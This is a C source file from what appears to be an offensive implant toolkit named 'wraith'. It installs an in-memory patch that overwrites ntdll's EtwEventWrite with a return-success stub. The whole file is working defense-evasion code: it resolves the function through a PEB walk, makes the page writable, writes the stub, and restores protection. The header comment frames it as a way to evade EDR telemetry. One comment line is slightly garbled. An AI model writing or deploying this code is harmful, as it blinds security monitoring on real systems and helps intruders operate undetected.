/*
 * src/stealth/etw/etw_patch.c
 *
 * Replace the first 3 bytes of `ntdll!EtwEventWrite` with the
 * canonical "no-op success" stub:
 *
 *  33 c0  xor eax, eax  ; eax = ERROR_SUCCESS
 *  c3  ret
 *
 * Notes:
 *  - ETW-TI (kernel ETW) is dispatched server-side and remains
 *  unaffected. EDRs that consume ETW-TI exclusively still see
 *  all events.
 *  - The patch covers EtwEventWrite. Sister entry points
 *  (EtwEventWriteEx, EtwEventWriteFull, etc.) are not patched
 *  by ; published EDR-evasion guides report the plain
 *  EtwEventWrite is what telemetry pipelines actually use.
 */

#include "wraith/wraith_stealth.h"
#include "runtime/rt_pebwalk.h"
#include "runtime/rt_resolver.h"
#include "stealth/etw/etw_patch.h"
#include "stealth/hashing/hash_djb2.h"

#include <stdint.h>
#include <string.h>
#include <windows.h>

static const uint8_t kEtwStub[] = { 0x33, 0xC0, 0xC3 };

wraith_status_t wr_etw_patch_install(void)
{
  void *ntdll = NULL;
  wraith_status_t rc = wr_pebwalk_find_module(wr_djb2_a("ntdll.dll"), &ntdll);
  if (rc != WRAITH_OK || !ntdll) {
  return WRAITH_E_RT_PEB_WALK_FAILED;
  }
  void *etw = NULL;
  rc = wr_resolver_lookup_a(ntdll, "EtwEventWrite", &etw);
  if (rc != WRAITH_OK || !etw) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }
  /* Idempotent fast-path. */
  if (memcmp(etw, kEtwStub, sizeof(kEtwStub)) == 0) {
  return WRAITH_OK;
  }
  DWORD old = 0;
  if (!VirtualProtect(etw, sizeof(kEtwStub), PAGE_READWRITE, &old)) {
  return WRAITH_E_MAP_PROTECT_FAILED;
  }
  memcpy(etw, kEtwStub, sizeof(kEtwStub));
  DWORD ignore = 0;
  VirtualProtect(etw, sizeof(kEtwStub), old, &ignore);
  FlushInstructionCache(GetCurrentProcess(), etw, sizeof(kEtwStub));
  return WRAITH_OK;
}

wraith_status_t wraith_patch_etw(void)
{
#if WRAITH_USE_ETW_PATCH
  return wr_etw_patch_install();
#else
  return WRAITH_E_FEATURE_DISABLED;
#endif
}
